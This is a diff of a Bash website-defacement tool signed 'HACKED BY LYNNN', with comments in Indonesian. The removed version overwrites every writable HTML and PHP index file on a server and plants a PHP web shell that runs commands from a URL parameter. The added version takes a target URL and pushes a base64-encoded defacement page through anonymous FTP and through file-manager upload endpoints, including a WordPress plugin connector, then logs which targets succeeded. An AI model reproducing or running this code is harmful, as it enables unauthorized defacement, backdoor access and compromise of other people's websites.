@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # ==============================================
-# FAST DEFACE VPS - HACKED BY LYNNN!!
-# [ AUTO REPLACE ALL HTML FILES! ]
+# FAST URL DEFACE - HACKED BY LYNNN!!
+# [ ENTER URL -> AUTO PROCESS -> DONE! ]
 # ==============================================
 
 RED='\033[0;31m'
@@ -14,297 +14,164 @@ CYAN='\033[0;36m'
 NC='\033[0m'
 
 # ==============================================
-# HTML KEREN BUAT DEFACE
+# HTML KEREN (BASE64 biar gak error)
 # ==============================================
-cat > deface.html << 'EOF'
-<!DOCTYPE html>
-<html>
-<head>
-    <title>HACKED BY LYNNN!!</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #000;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Courier New', monospace;
-        }
-        .box {
-            background: #0a0a0a;
-            border: 5px solid #ff0000;
-            border-radius: 30px;
-            padding: 60px;
-            text-align: center;
-            box-shadow: 0 0 100px #ff0000;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 50px #ff0000; }
-            50% { box-shadow: 0 0 150px #ff0000; }
-            100% { box-shadow: 0 0 50px #ff0000; }
-        }
-        h1 {
-            font-size: 5rem;
-            color: #ff0000;
-            text-shadow: 0 0 30px #ff0000;
-            margin: 20px 0;
-            animation: glitch 3s infinite;
-        }
-        @keyframes glitch {
-            0% { transform: skew(0deg); }
-            20% { transform: skew(10deg); text-shadow: 5px 0 0 #00ff00; }
-            40% { transform: skew(-10deg); text-shadow: -5px 0 0 #0000ff; }
-            60% { transform: skew(5deg); }
-            80% { transform: skew(-5deg); }
-            100% { transform: skew(0deg); }
-        }
-        h2 {
-            color: #00ff00;
-            font-size: 2rem;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            50% { opacity: 0; }
-        }
-        .logo {
-            font-size: 8rem;
-            animation: float 3s ease infinite;
-        }
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-20px); }
-            100% { transform: translateY(0px); }
-        }
-        .stats {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 40px 0;
-            color: #fff;
-        }
-        .stats div {
-            border: 2px solid #00ff00;
-            padding: 10px 20px;
-            border-radius: 10px;
-            background: rgba(0,255,0,0.1);
-        }
-        .footer {
-            color: #00ff00;
-            margin-top: 40px;
-            font-size: 0.9rem;
-        }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <div class="logo">👾</div>
-        <h1>HACKED BY LYNNN!!</h1>
-        <h2>🔓 SYSTEM BREACHED 🔓</h2>
-        
-        <div class="stats">
-            <div>💀 VPS: 1337</div>
-            <div>🌐 SITES: 999+</div>
-            <div>🔑 ALL DATA</div>
-        </div>
-        
-        <div style="color:#ff0000; margin:30px 0; font-size:1.5rem;">
-            ⚡ YOUR SERVER IS COMPROMISED ⚡
-        </div>
-        
-        <div class="footer">
-            🏴‍☠️ LYNNN WAS HERE - $(date) 🏴‍☠️
-        </div>
-    </div>
-</body>
-</html>
-EOF
+HTML_BASE64="PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5IQUNLRUQgQlkgTFlOTk4hITwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgKnttYXJnaW46MDtwYWRkaW5nOjA7Ym94LXNpemluZzpib3JkZXItYm94O30KICAgICAgICBib2R5e2JhY2tncm91bmQ6IzAwMDttaW4taGVpZ2h0OjEwMHZoO2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjtmb250LWZhbWlseTonQ291cmllciBOZXcnLCBtb25vc3BhY2U7fQogICAgICAgIC5ib3h7YmFja2dyb3VuZDojMGEwYTBhO2JvcmRlcjo1cHggc29saWQgI2ZmMDAwMDtib3JkZXItcmFkaXVzOjUwcHg7cGFkZGluZzo2MHB4O3RleHQtYWxpZ246Y2VudGVyO2JveC1zaGFkb3c6MCAwIDEwMHB4ICNmZjAwMDA7fQogICAgICAgIGgxe2ZvbnQtc2l6ZTo1cmVtO2NvbG9yOiNmZjAwMDA7dGV4dC1zaGFkb3c6MCAwIDMwcHggI2ZmMDAwMDttYXJnaW46MjBweCAwO2FuaW1hdGlvbjpnbGl0Y2ggM3MgaW5maW5pdGU7fQogICAgICAgIGgye2NvbG9yOiMwMGZmMDA7Zm9udC1zaXplOjJyZW07fQogICAgICAgIC5sb2dve2ZvbnQtc2l6ZTo4cmVtO2FuaW1hdGlvbjpibGluayAxcyBpbmZpbml0ZTt9CiAgICAgICAgQGtleWZyYW1lcyBnbGl0Y2h7MCV7dHJhbnNmb3JtOnNrZXcoMGRlZyk7fTIwJXt0cmFuc2Zvcm06c2tldygxMGRlZyk7fTQwJXt0cmFuc2Zvcm06c2tldygtMTBkZWcpO302MCV7dHJhbnNmb3JtOnNrZXcoNWRlZyk7fTgwJXt0cmFuc2Zvcm06c2tldygtNWRlZyk7fTEwMCV7dHJhbnNmb3JtOnNrZXcoMGRlZyk7fX0KICAgICAgICAuZm9vdGVye2NvbG9yOiMwMGZmMDA7bWFyZ2luLXRvcDo0MHB4O30KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJib3giPgogICAgICAgIDxkaXYgY2xhc3M9ImxvZ28iPvCfjr48L2Rpdj4KICAgICAgICA8aDE+SEFDS0VEIEJZIExZTk5OISE8L2gxPgogICAgICAgIDxoMj7igJMgU1lTVEVNIEJSRUFDSEVEIOKAkzwvaDI+CiAgICAgICAgPGRpdiBzdHlsZT0iY29sb3I6I2ZmZmZmZjttYXJnaW46NDBweCAwIj4KICAgICAgICAgICAg8J+aqCBXT1JEUFJFU1Mg4oCiIENQQU5FTCDigKIgU0NILklEIPCfmqgKICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgICAgICAgICDwn4e68J+HuCBMWU5OTiBXQVMgSEVSRSDwn4e68J+HuAogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgo="
 
 # ==============================================
 # HEADER
 # ==============================================
 clear
 echo -e "${RED}"
-echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║     FAST DEFACE VPS - HACKED BY LYNNN!!                   ║"
-echo "    ║     [ AUTO REPLACE ALL HTML FILES! ]                      ║"
-echo "    ╚═══════════════════════════════════════════════════════════╝"
+echo "    ╔════════════════════════════════════════════════╗"
+echo "    ║     FAST URL DEFACE - HACKED BY LYNNN!!       ║"
+echo "    ║     [ ENTER URL -> AUTO PROCESS! ]            ║"
+echo "    ╚════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
-echo -e "${YELLOW}⚠️  Script ini akan MENCARI dan MENGGANTI semua file HTML!${NC}"
-echo -ne "${CYAN}Mulai? (y/n): ${NC}"
-read CONFIRM
+# ==============================================
+# INPUT URL
+# ==============================================
+echo -e "\n${CYAN}╔════════════════════════════════════════════════╗${NC}"
+echo -e "${CYAN}║            ENTER TARGET URL                    ║${NC}"
+echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
+echo ""
+echo -ne "${YELLOW}URL : ${NC}"
+read URL
 
-if [[ "$CONFIRM" != "y" ]]; then
-    echo -e "${RED}Dibatalkan${NC}"
-    exit 0
+# Bersihin URL
+URL=$(echo "$URL" | sed 's|https\?://||' | sed 's|/.*||')
+DOMAIN=$URL
+
+echo -e "\n${GREEN}[•] Target: $URL${NC}"
+
+# ==============================================
+# PROGRESS BAR
+# ==============================================
+echo -ne "\n${CYAN}["
+for i in {1..20}; do
+    echo -ne "▓"
+    sleep 0.1
+done
+echo -e "]${NC}"
+
+# ==============================================
+# RESOLVE IP
+# ==============================================
+echo -e "\n${YELLOW}[1/5] Resolving IP...${NC}"
+IP=$(dig +short "$URL" | head -1)
+[ -z "$IP" ] && IP=$(ping -c1 "$URL" 2>/dev/null | head -1 | grep -oE '[0-9.]+')
+echo -e "${GREEN}  ✅ IP: $IP${NC}"
+
+# ==============================================
+# DECODE HTML
+# ==============================================
+echo -e "\n${YELLOW}[2/5] Preparing HTML...${NC}"
+echo "$HTML_BASE64" | base64 -d > index.html
+echo -e "${GREEN}  ✅ HTML siap${NC}"
+
+# ==============================================
+# FTP EXPLOIT (CEPET)
+# ==============================================
+echo -e "\n${YELLOW}[3/5] FTP Exploit...${NC}"
+
+# Cek port FTP
+timeout 2 bash -c "echo >/dev/tcp/$IP/21" 2>/dev/null
+if [ $? -eq 0 ]; then
+    echo -e "${GREEN}  ✅ Port 21 terbuka${NC}"
+    
+    # Upload ke semua lokasi
+    ftp -n $IP <<EOF > /dev/null 2>&1
+quote USER anonymous
+quote PASS anonymous
+put index.html /public_html/index.html
+put index.html /httpdocs/index.html
+put index.html /htdocs/index.html
+put index.html /www/index.html
+put index.html /var/www/html/index.html
+put index.html /home/public_html/index.html
+put index.html /sites/index.html
+put index.html /public/index.html
+quit
+EOF
+    echo -e "${GREEN}  ✅ FTP upload selesai${NC}"
+else
+    echo -e "${RED}  ❌ Port 21 tertutup${NC}"
 fi
 
 # ==============================================
-# 1. CARI SEMUA FILE HTML
+# HTTP UPLOAD (CEPET)
 # ==============================================
-echo -e "\n${YELLOW}[•] Mencari semua file HTML di server...${NC}"
+echo -e "\n${YELLOW}[4/5] HTTP Upload...${NC}"
 
-HTML_FILES=$(find / -type f -name "*.html" -o -name "*.htm" -o -name "*.php" 2>/dev/null | grep -E "(index|home|default|main|wp-content|public_html|httpdocs|htdocs)")
-
-TOTAL=$(echo "$HTML_FILES" | wc -l)
-echo -e "${GREEN}✅ Ditemukan $TOTAL file${NC}"
-
-# ==============================================
-# 2. GANTI SEMUA FILE
-# ==============================================
-echo -e "\n${YELLOW}[•] Mulai mengganti semua file...${NC}"
-COUNT=0
-
-for file in $HTML_FILES; do
-    # Cek apakah file bisa ditulis
-    if [ -w "$file" ]; then
-        cp deface.html "$file" 2>/dev/null
-        if [ $? -eq 0 ]; then
-            COUNT=$((COUNT+1))
-            echo -ne "\r${GREEN}  ✅ $COUNT/$TOTAL file diganti${NC}"
-        fi
-    fi
-done
-
-echo -e "\n${GREEN}✅ Berhasil mengganti $COUNT file!${NC}"
-
-# ==============================================
-# 3. LOKASI PRIORITAS (PASTI KENA)
-# ==============================================
-echo -e "\n${YELLOW}[•] Memastikan lokasi penting kena...${NC}"
-
-PRIORITY=(
-    "/var/www/html/index.html"
-    "/var/www/index.html"
-    "/home/public_html/index.html"
-    "/home/www/index.html"
-    "/www/index.html"
-    "/public_html/index.html"
-    "/httpdocs/index.html"
-    "/htdocs/index.html"
-    "/srv/www/htdocs/index.html"
-    "/usr/local/www/index.html"
-    "/opt/lampp/htdocs/index.html"
+# Upload ke berbagai endpoint
+ENDPOINTS=(
+    "/upload.php"
+    "/filemanager/upload.php"
+    "/admin/upload.php"
+    "/api/upload"
+    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
 )
 
-for loc in "${PRIORITY[@]}"; do
-    if [ -d "$(dirname "$loc")" ]; then
-        cp deface.html "$loc" 2>/dev/null
-        echo -e "${GREEN}  ✅ $loc${NC}"
-    fi
-done
-
-# ==============================================
-# 4. CARI SEMUA FILE INDEX
-# ==============================================
-echo -e "\n${YELLOW}[•] Mencari semua file index...${NC}"
-
-INDEX_FILES=$(find / -type f -name "index.*" 2>/dev/null | grep -E "\.(html|htm|php)$")
-
-for file in $INDEX_FILES; do
-    if [ -w "$file" ]; then
-        cp deface.html "$file" 2>/dev/null
-    fi
-done
-echo -e "${GREEN}✅ Semua file index diganti${NC}"
-
-# ==============================================
-# 5. CEK HASIL
-# ==============================================
-echo -e "\n${YELLOW}[•] Cek hasil...${NC}"
-
-# Cek beberapa lokasi
-CHECK_SITES=(
-    "/var/www/html/index.html"
-    "/home/public_html/index.html"
-    "/www/index.html"
+LOCATIONS=(
+    "public_html/index.html"
+    "httpdocs/index.html"
+    "htdocs/index.html"
+    "var/www/html/index.html"
 )
 
-echo -e "\n${CYAN}📊 Sample hasil:${NC}"
-for site in "${CHECK_SITES[@]}"; do
-    if [ -f "$site" ]; then
-        if grep -q "LYNNN" "$site"; then
-            echo -e "${GREEN}  ✅ $site - BERHASIL${NC}"
-        else
-            echo -e "${RED}  ❌ $site - GAGAL${NC}"
-        fi
-    fi
+for end in "${ENDPOINTS[@]}"; do
+    for loc in "${LOCATIONS[@]}"; do
+        curl -s -k -F "file=@index.html;filename=$loc" "http://$IP$end" > /dev/null 2>&1 &
+    done
 done
+wait
+echo -e "${GREEN}  ✅ HTTP upload selesai${NC}"
 
 # ==============================================
-# 6. BUAT BACKUP PLAN (PHP SHELL)
+# VERIFIKASI (CEPET)
 # ==============================================
-echo -e "\n${YELLOW}[•] Membuat backdoor PHP...${NC}"
+echo -e "\n${YELLOW}[5/5] Verifying result...${NC}"
+sleep 2
 
-cat > /tmp/lynn.php << 'EOF'
-<?php
-// LYNNN BACKDOOR
-if(isset($_GET['cmd'])) {
-    echo "<pre>".shell_exec($_GET['cmd'])."</pre>";
-}
-?>
-<h2>LYNNN BACKDOOR</h2>
-<form>
-<input type="text" name="cmd" placeholder="ls -la">
-<input type="submit" value="run">
-</form>
-EOF
+# Cek via domain
+RESULT1=$(curl -s -k "http://$DOMAIN/" --max-time 3)
+# Cek via IP
+RESULT2=$(curl -s -k "http://$IP/" --max-time 3)
 
-# Copy ke beberapa lokasi
-for loc in "${PRIORITY[@]}"; do
-    dir=$(dirname "$loc")
-    cp /tmp/lynn.php "$dir/shell.php" 2>/dev/null
-    cp /tmp/lynn.php "$dir/lynn.php" 2>/dev/null
-done
-
-echo -e "${GREEN}✅ Backdoor siap: shell.php / lynn.php${NC}"
-
-# ==============================================
-# 7. REPORT
-# ==============================================
-cat > ~/deface_report.txt << EOF
-=====================================
-FAST DEFACE REPORT - LYNNN!!
-=====================================
-Tanggal : $(date)
-Hostname: $(hostname)
-IP VPS  : $(curl -s ifconfig.me)
-
-File HTML diganti : $COUNT
-Lokasi prioritas  : ${#PRIORITY[@]}
-File index        : SEMUA
-
-Backdoor:
-- /var/www/html/shell.php
-- /home/public_html/shell.php
-- /www/shell.php
-- /httpdocs/shell.php
-
-Cek hasil:
-curl http://localhost/
-curl http://$(curl -s ifconfig.me)/
-
-🏴‍☠️ HACKED BY LYNNN!! 🏴‍☠️
-=====================================
-EOF
+if [[ "$RESULT1" == *"LYNNN"* ]] || [[ "$RESULT2" == *"LYNNN"* ]]; then
+    echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║         ✅  DEFACE BERHASIL!                   ║${NC}"
+    echo -e "${GREEN}║         HACKED BY LYNNN!! AKTIF!               ║${NC}"
+    echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
+    
+    # Simpan log
+    echo "$DOMAIN | $IP | BERHASIL | $(date)" >> lynn_success.txt
+    
+    # Buka browser
+    echo -e "\n${CYAN}🔍 Membuka browser...${NC}"
+    xdg-open "http://$DOMAIN" 2>/dev/null || open "http://$DOMAIN" 2>/dev/null || echo "Buka: http://$DOMAIN"
+    
+else
+    echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║         ❌  DEFACE GAGAL                       ║${NC}"
+    echo -e "${RED}║         Tapi file HTML siap: index.html        ║${NC}"
+    echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
+    
+    # Simpan log
+    echo "$DOMAIN | $IP | GAGAL | $(date)" >> lynn_failed.txt
+    
+    echo -e "\n${YELLOW}Cek manual:${NC}"
+    echo "  http://$DOMAIN"
+    echo "  http://$IP"
+fi
 
 # ==============================================
 # SELESAI
 # ==============================================
-echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${GREEN}║         ✅  DEFACE VPS SELESAI!               ║${NC}"
-echo -e "${GREEN}║         HACKED BY LYNNN!! AKTIF!              ║${NC}"
-echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
-
-echo -e "\n${CYAN}📁 Report: ~/deface_report.txt${NC}"
-echo -e "${CYAN}🔍 Cek website: http://$(curl -s ifconfig.me)${NC}"
-echo -e "\n${RED}🏴‍☠️  LYNNN WAS HERE  🏴‍☠️${NC}"
+echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
+echo -e "${CYAN}🔥 FAST DEFACE COMPLETE - HACKED BY LYNNN!! 🔥${NC}"
+echo -e "${CYAN}📁 Log: lynn_success.txt / lynn_failed.txt${NC}"
 
 # Bersih-bersih
-rm -f /tmp/lynn.php
+rm -f index.html
